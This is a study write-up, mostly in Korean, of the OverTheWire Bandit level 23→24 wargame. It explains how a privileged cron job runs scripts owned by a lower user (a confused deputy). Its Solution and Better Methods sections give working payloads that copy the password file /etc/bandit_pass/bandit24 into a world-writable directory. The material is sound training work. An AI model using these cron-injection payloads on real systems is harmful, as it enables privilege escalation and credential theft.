---
date: 2026-07-15
wargame: Bandit
level: 23
title: "Bandit Level 23 → 24"
difficulty: ★★★
time_spent: 45min
tags: [bandit, linux, cron, scheduled-task, privilege-escalation, script-injection, confused-deputy, crlf]
status: 🟡 developing
tools_used: [cron, mktemp, printf, chmod, stat, id, cat]
new_concepts: [Cron_Script_Injection, Confused_Deputy]
prerequisites: [Level_22]
---

# Bandit Level 23 → 24

## [Phase 1] Executive Summary

- **Goal**: cron이 `cronjob_bandit24.sh`를 **bandit24 권한**으로 매분 실행 → `/var/spool/bandit24/foo`에서 **owner가 bandit23인 스크립트를 실행 후 삭제**한다. 나(bandit23)가 "bandit24 password를 내가 읽을 수 있는 곳으로 복사"하는 스크립트를 그 디렉터리에 **심으면**, cron이 그걸 bandit24로 대신 실행해준다 → password 유출.
- **Key Skill**: **script injection into a privileged scheduled executor** (confused deputy). world-writable drop dir(`mktemp -d` + `chmod 777`) 준비 → payload가 bandit24로 실행되어 secret을 그 dir에 write → 회수. 1회성(cron이 실행 후 `rm`)이라 매 시도 재드롭. **printf로 CRLF shebang 차단**, `id>proof`로 실행 여부·신원 자가진단.
- **Tags**: `[Cron_Script_Injection]`, `[Confused_Deputy]`, `[File_Permissions]`, `[Setuid]`(권한 컨텍스트 계열)

[Cognitive Validation]
- **Limit Test**: owner 게이트가 만약 `== "bandit24"`(자기 것만 실행)였다면 bandit23은 주입 불가 → 풀 수 없음. 반대로 게이트가 없었다면 아무나 코드 주입 → 더 위험. 게이트가 **"심는 자=bandit23, 실행자=bandit24"**를 정확히 잇는 지점이 취약점의 본질.
- **Control Knob**: ① 스크립트가 foo에 있고 `owner=bandit23`인가 ② drop dir이 bandit24에게 **writable(777)**인가 ③ shebang이 유효한가(**LF**, not CRLF). 셋 다 참이라야 password가 나온다 — 하나라도 거짓이면 **무증상 실패**(cron이 에러를 `/dev/null`로 삼킴).
- **Nullity**: 스크립트를 내가 직접 실행 → `whoami=bandit23` → `cat /etc/bandit_pass/bandit24`는 `Permission denied`. 실행 주체가 bandit24여야만 의미. cron이 그 역할.

---

## [Phase 2] Deep Dive

### 1. Concept Categorization

**Privilege escalation via script injection into a scheduled privileged executor (confused deputy)**. Level 21·22는 "cron이 **남긴 산출물을 read**"였다. Level 23은 질적으로 다르다 — "cron이 **실행할 코드를 내가 주입**"한다. cron(bandit24)이 나(bandit23)의 코드를 **자기 권한으로 대신 실행**해주는 confused deputy 구조. 데이터를 읽는 게 아니라 **실행 흐름을 가로챈다**.

### 2. Definition (Formal, EN)

The cron entry `* * * * * bandit24 /usr/bin/cronjob_bandit24.sh` runs as **bandit24**. The script:

```bash
myname=$(whoami)                       # = bandit24 when cron runs it
cd /var/spool/"$myname"/foo || exit    # cd /var/spool/bandit24/foo
for i in * .*; do
  if [ "$i" != "." ] && [ "$i" != ".." ]; then
    owner="$(stat --format "%U" "./$i")"
    if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
      timeout -s 9 60 "./$i"           # execute AS bandit24, ≤60s
    fi
    rm -rf "./$i"                       # then delete (one-shot)
  fi
done
```

For each entry it executes `./i` **iff** `stat` reports its owner as `bandit23` and it is a regular file, then removes it. Because bandit23 can create files in that directory, bandit23 can supply **arbitrary code that cron executes with bandit24's UID** — a **confused-deputy** escalation. The injected payload reads `/etc/bandit_pass/bandit24` (permitted for UID bandit24) and writes it to a bandit23-readable location.

### 3. Intuition (KR)

**대리 집행자.** cron(bandit24)은 "bandit23이 놓아둔 쪽지는 내가 대신 실행해준다"는 규칙을 가진 집행자다. 나는 bandit24의 금고를 못 열지만, **"이 금고 열어서 내용을 공용함에 넣어줘"**라고 적은 쪽지를 놓으면 집행자가 자기 권한으로 열어 넣어준다. 게이트(`owner=bandit23`)는 "내가 놓은 쪽지"임을 확인하는 보안 조건인데, **바로 그게 주입 통로**가 된다.

### 4. Theory (Mechanism)

성공 실행의 인과 사슬:

1. 나(bandit23)가 `/var/spool/bandit24/foo/jy_3`을 심는다 — `owner=bandit23`, 실행권한(`-rwxrwxr-x`).
2. ≤60초 내 cron이 발화 → `cronjob_bandit24.sh`를 **bandit24로** 실행 → `myname=bandit24` → `cd /var/spool/bandit24/foo` → glob에서 `jy_3` 발견.
3. 게이트: `stat` owner == `bandit23`? **예**. 정규 파일? **예**. → `timeout -s 9 60 ./jy_3` — **bandit24 권한으로 실행**.
4. `jy_3` 내부(이 순간 EUID=bandit24):
   - `id > $D/proof` → **`uid=11024(bandit24)`** 기록 (실행됐다 + bandit24로 실행됐다는 증거).
   - `cat /etc/bandit_pass/bandit24 > $D/pass` → bandit24가 **자기** password를 읽어(허용) world-writable `$D`에 write.
5. cron이 `jy_3`을 `rm` (그래서 이후 `cat jy_`는 `No such file`).
6. 나(bandit23)가 `$D/pass`를 read → bandit24 password.

인과: 나=코드 작성자(조건) → cron=bandit24가 게이트 통과 후 실행(B) → 내 코드가 bandit24 자격으로 secret read·write(C) → 나는 그 파일 read(D).

### 5. Solution

```bash
# SSH connection
$ ssh -p 2220 bandit23@bandit.labs.overthewire.org
# Password: <password masked>

# 1) 실행되는 cron 스크립트 확인 → owner 게이트 + foo 경로 파악
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
shopt -s nullglob
myname=$(whoami)
cd /var/spool/"$myname"/foo || exit
for i in * .*; do
  if [ "$i" != "." ] && [ "$i" != ".." ]; then
    owner="$(stat --format "%U" "./$i")"
    if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
      timeout -s 9 60 "./$i"     # ← bandit23-소유 스크립트를 bandit24로 실행
    fi
    rm -rf "./$i"                 # ← 실행 후 삭제 (1회성)
  fi
done

# 2) world-writable drop-off 디렉터리 준비 (bandit24가 write 가능해야)
bandit23@bandit:~$ D=$(mktemp -d); chmod 777 "$D"; echo "$D"
/tmp/tmp.QU5KJmfRBi
#   mktemp -d 기본은 700(owner-only) → bandit24(other)가 못 씀 → chmod 777 필수

# 3) payload 주입 — heredoc으로 스크립트 작성 (에디터 없이 → CRLF 없음)
bandit23@bandit:~$ cat > /var/spool/bandit24/foo/jy_$$ << EOF
> #!/bin/bash
> cat /etc/bandit_pass/bandit24 > /tmp/tmp.QU5KJmfRBi/pass
> EOF
#   cat > 파일       : heredoc(stdin)을 그 파일로 write
#   << EOF (따옴표 X): 본문 그대로. 종료어 EOF는 그 줄에 '홀로' (뒤 공백·백슬래시 금지)
bandit23@bandit:~$ chmod +x /var/spool/bandit24/foo/jy_$$
#   ./jy_N 로 직접 실행되니 실행권한 필수 (owner=bandit23은 heredoc 생성 시 자동)

# 4) 다음 cron 틱(≤60초) 후 회수 — "1분"은 데드라인이 아니라 재시도 주기(무한 반복)
bandit23@bandit:~$ cat /tmp/tmp.QU5KJmfRBi/pass
cat: /tmp/tmp.QU5KJmfRBi/pass: No such file or directory   # 아직 cron 실행 전 (기다린다)
bandit23@bandit:~$ cat /tmp/tmp.QU5KJmfRBi/pass
<password masked>                                          # ← bandit24 (Level 24) password

# (디버깅 계측) 무증상 실패를 진단할 땐 payload에 자가 로그를 넣었다:
#   printf '#!/bin/bash\nid > %s/proof 2>&1\ncat /etc/bandit_pass/bandit24 > %s/pass 2>>%s/proof\n' "$D" "$D" "$D" > /var/spool/bandit24/foo/jy_$$
#   → cron 실행 후 $D/proof 에 'uid=11024(bandit24)' 가 찍혀 "실행됨 + 실행주체=bandit24" 확정 (Phase 4·7)
```

> [!warning] Password Masking & 무증상 실패의 함정
> bandit24 password 마스킹. 이 레벨의 진짜 난이도는 exploit 논리가 아니라 **디버깅**이다: cron이 stdout/stderr를 `&> /dev/null`로 **삼켜서**, 모든 실패가 "hello는 사라졌는데(=cron이 rm) 결과 파일은 없음"으로만 보인다. `id > proof`(자가 로그)가 없으면 "실행이 됐나 / 어디서 막혔나"를 알 길이 없다. **cron 디버깅 = 스크립트가 스스로 흔적을 파일로 남기게 하는 것.**

### 6. Why It Works

권한 원천은 L21·L22와 같은 계열(cron의 USER 필드 = 실행 계정 = bandit24)이지만, 여기선 **읽기가 아니라 실행을 빌린다**. 나는 bandit23이라 `/etc/bandit_pass/bandit24`를 직접 못 읽는다(직접 실행 시 `Permission denied`). 하지만 cron이 내 스크립트를 **bandit24로 대신 실행**하므로, 스크립트 안의 `cat /etc/bandit_pass/bandit24`는 **bandit24의 손으로** 수행된다. `owner=="bandit23"` 게이트는 "bandit23이 놓은 스크립트만 실행"이라는 보안 의도지만, bandit23이 임의 코드를 놓을 수 있으니 그대로 **bandit24 권한 코드 실행 통로**가 된다 — 전형적 **confused deputy**.

### 7. Edge Cases / Limitation (= 이번 세션 삽질 로그)

- **CRLF shebang**: 에디터(nano/vi)·붙여넣기가 `#!/bin/bash` 뒤에 `\r` 삽입 → 커널이 인터프리터를 `/bin/bash\r`로 찾다 실패(`bad interpreter`) → **실행 자체가 안 됨**. cron이 에러를 삼켜 무증상. → **`printf`로 생성**(실제 줄바꿈 없이 `\n` 해석)하거나 `file`/`cat -A`로 CRLF 확인.
- **stderr blindness**: cron `&> /dev/null` → 스크립트가 자기 에러를 파일로 남겨야(`2>>proof`) 디버깅 가능.
- **drop dir 권한**: `mktemp -d`=**700** → bandit24가 write 불가 → payload가 조용히 실패. `chmod 777` 필수.
- **empty-dir wipe**: `clean_tmp`의 `find /tmp -amin +5 -type d -empty -delete` → 빈 임시 dir을 5분 방치하면 삭제. 1분 내 pass가 써지면 non-empty가 되어 안전.
- **one-shot**: cron이 실행 후 스크립트를 `rm` → 결과가 안 나오면 **매번 재드롭**해야(스크립트 재생성).
- **경로 일관성**: proof/pass를 서로 다른 tmp dir에 두면 "안 나온다"고 착각. `$D` 하나로 통일.
- **직접 실행 함정**: 손으로 돌리면 `whoami=bandit23` → bandit24 pass 못 읽음. 실행 주체 검증은 **`id` 증거**로.

---

## [Phase 3] Formal Summary (EN)

> [!definition] Confused deputy
> A **confused deputy** is a privileged program (the *deputy*) that performs a sensitive action on behalf of a less-privileged party, where the *party* controls **what** action is taken but the *deputy* supplies the **authority**. Here the deputy is `cronjob_bandit24.sh` running as bandit24; bandit23 supplies the code (a file it owns), and the deputy executes it with bandit24's UID. The access-control check on the *file's owner* fails to prevent the *content* from being attacker-chosen.

> [!theorem] The owner gate is the injection channel
> The job executes `./i` as bandit24 **iff** `owner(i) = bandit23 ∧ regularfile(i)`. Since bandit23 has write permission on the directory, bandit23 can create `i` with arbitrary content and `owner(i)=bandit23`. ∴ bandit23 can cause arbitrary code to run with bandit24's authority. The gate meant to *restrict* execution to bandit23's files is exactly what *authorises* bandit23's injection. □

---

## [Phase 4] Better Methods

**Current approach** (used above): `mktemp -d` + `chmod 777` → `printf` payload(id 자가로그 + pass) 주입 → `sleep 65` → 회수. 디버깅 계측(`id>proof`)까지 포함한 진단형.

**Alternative 1**: payload가 스스로 결과 파일 권한을 열기 (drop dir chmod 생략)
```bash
printf '#!/bin/bash\ncp /etc/bandit_pass/bandit24 /tmp/b24 && chmod 644 /tmp/b24\n' > /var/spool/bandit24/foo/x
chmod +x /var/spool/bandit24/foo/x
#   dir 준비 없이 /tmp에 직접 쓰고 payload가 chmod 644 → bandit23 read 가능
```
Trade-off: 사전 dir 준비 불필요하나, 결과 파일명이 고정(`/tmp/b24`)이라 타 플레이어와 충돌·wipe 위험. 777 dir 방식이 더 격리적.

**Alternative 2**: 계측 제거한 최소 payload (원리를 이해한 뒤)
```bash
D=$(mktemp -d); chmod 777 "$D"
printf '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > %s/p\n' "$D" > /var/spool/bandit24/foo/x; chmod +x /var/spool/bandit24/foo/x
```
Trade-off: `id>proof` 없이 간결. 단, 실패 시 원인 파악 어려움 — 디버깅 중엔 계측 유지가 낫다.

**Most elegant**:
```bash
D=$(mktemp -d); chmod 777 "$D"; printf '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > %s/p\n' "$D" > /var/spool/bandit24/foo/x; chmod +x /var/spool/bandit24/foo/x; sleep 61; cat "$D/p"
```
Why elegant: 준비→주입→대기→회수를 **한 줄**로. `printf`로 CRLF 차단, `$D` 일관, world-writable dir로 격리. 원리를 알면 이 한 줄이 전부다.

---

## [Phase 5] Lessons Learned

1. **Confused deputy**: 특권 실행자가 저권한자의 **코드**를 대신 실행하면, "누가 놓았나"를 확인하는 게이트가 곧 **주입 통로**가 된다. L21·22는 데이터 read, L23은 **실행 흐름 하이재킹**.
2. **CRLF shebang 함정**: 에디터/붙여넣기의 `\r`이 `#!/bin/bash`를 무효화(`/bin/bash\r: bad interpreter`). `printf`/heredoc으로 생성, `file`로 검증.
3. **cron은 출력을 버린다**: stdout·stderr가 `&>/dev/null`. 디버깅하려면 스크립트가 **스스로 로그를 파일로**(`id > proof`, `2>>proof`) 남겨야 한다.
4. **`mktemp -d`는 700**: 남(bandit24)이 write하려면 `chmod 777`. 권한은 항상 "누가 쓰고 누가 읽나" 두 방향으로 점검.
5. **1회성 + 경로 일관성**: cron이 스크립트를 `rm`하니 재드롭, proof/pass는 같은 dir에서 회수(엉뚱한 dir 확인 착각 주의).
6. **직접 실행 ≠ 검증**: whoami가 달라 결과가 다르다. 진짜 실행 주체는 **`id` 증거**로 확인(`uid=bandit24`).

### Quiz

**Q**: (a) 넌 bandit23인데 네가 심은 스크립트가 bandit24 password를 읽을 수 있는 이유는? (b) 초기 payload들이 **조용히**(무증상) 실패한 흔한 원인 두 가지는? (c) payload에 `id > proof`를 넣은 목적은?

> [!tip]- 풀이
> **(a)** 스크립트를 실행하는 주체가 **cron = bandit24**(crontab USER 필드)다. 파일 소유자가 bandit23이라도 cron이 그걸 자기(bandit24) 권한으로 `./` 실행하므로, 내부의 `cat /etc/bandit_pass/bandit24`는 bandit24 자격으로 수행 → 허용. **confused deputy** — 내가 코드를, cron이 권한을 제공.
>
> **(b)** ① drop dir이 `mktemp -d` 기본 **700**이라 bandit24가 write 불가; ② shebang **CRLF**로 `/bin/bash\r` → exec 실패. 둘 다 cron이 `&> /dev/null`로 삼켜 **아무 에러도 안 보임**.
>
> **(c)** cron이 출력·에러를 버리므로, 스크립트가 **실행됐는지 + 어떤 신원으로 실행됐는지**를 스스로 파일에 남겨 증명하려는 계측. `proof`에 `uid=bandit24`가 뜨면 실행+신원 둘 다 확인 → 실패 원인을 dir/CRLF/게이트 중 어디인지 좁힐 수 있다.
>
> 핵심: **"코드는 누가 쓰고, 권한은 누가 주나"**를 분리해서 보면 confused deputy가 보인다. 그리고 **로그를 삼키는 실행자는 스스로 로그를 남겨 뚫는다.**

> [!flashcard]
> **Q**: Level 23에서 bandit23이 bandit24 password를 얻는 핵심 메커니즘은?
> **A**: cron이 bandit24로 `/var/spool/bandit24/foo`의 **bandit23-소유 스크립트를 실행**해준다(confused deputy). bandit24 권한으로 도는 내 스크립트가 `/etc/bandit_pass/bandit24`를 읽어 world-writable 위치에 남기고, 나는 그걸 read.

> [!flashcard]
> **Q**: 스크립트가 실행돼도 아무 출력이 없을 때 cron을 어떻게 디버깅하나?
> **A**: cron이 stdout/stderr를 `&> /dev/null`로 버리므로, 스크립트가 스스로 `id`·에러를 **파일로 리다이렉트**(`id>log`, `2>>log`)해 흔적을 남긴다. 출력이 실행자에게 못 가면, 파일시스템에 남겨라.

> [!flashcard]
> **Q**: `#!/bin/bash` 스크립트가 `bad interpreter: /bin/bash^M`로 죽는 이유는?
> **A**: **CRLF** 줄바꿈 — shebang 끝의 `\r`이 인터프리터 경로에 붙어 `/bin/bash\r`을 찾다 실패. 에디터/붙여넣기가 원인. `printf`/`dos2unix`로 LF 보장.

---

## Links

### Tools Used
- [[Tools/mktemp]]
- [[Tools/printf]]
- [[Tools/chmod]]
- [[Tools/stat]]

### Concepts Introduced (first encountered here)
- [[Concepts/Linux/Cron_Script_Injection]]
- [[Concepts/Linux/Confused_Deputy]]
- [[Concepts/Linux/Shell_Fundamentals]] (lite note — 세션 중 판 shell 기초: `$`확장/quote/fd·redirect/heredoc/CRLF/`install` 등)

### Concepts Applied (reused from earlier)
- [[Concepts/Linux/Cron]] (Level 21·22 — 거기선 산출물 read, 여기선 실행 흐름 주입)
- [[Concepts/Linux/File_Permissions]] (777 drop dir, owner 게이트, umask)
- [[Concepts/Linux/Setuid]] (Level 19 — 권한 컨텍스트 계열; 여기선 cron USER 필드가 부여)

### Navigation
- **Prerequisite**: [[Level_22]]
- **Next**: [[Level_24]]
- **MOC**: [[_MOC/MOC_Bandit]]

### External References
- Bandit Official: https://overthewire.org/wargames/bandit/bandit24.html
- `crontab(5)` — system crontab USER 필드; `cron(8)` — `&>/dev/null` 로깅
- Confused deputy problem — Norm Hardy, 1988 (capability-based access control)
- `printf(1)` / `file(1)` — CRLF 진단; `stat(1)` — `%U`(owner) `%A`(mode)
